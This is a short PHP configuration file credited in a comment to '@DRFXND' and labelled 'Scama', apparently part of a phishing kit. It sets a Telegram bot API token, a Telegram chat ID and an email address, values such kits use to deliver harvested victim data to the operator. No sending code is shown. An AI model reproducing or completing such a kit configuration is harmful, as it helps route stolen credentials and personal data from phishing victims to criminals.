<?php

// Scama By @DRFXND //

$api="7163454206:AAGB5_OfRZOiOtxUsJTWVSntI8uhnuYMgSA";
$chatid="5412557482";

$Email="HowardFeldstein@gmx.com";

?>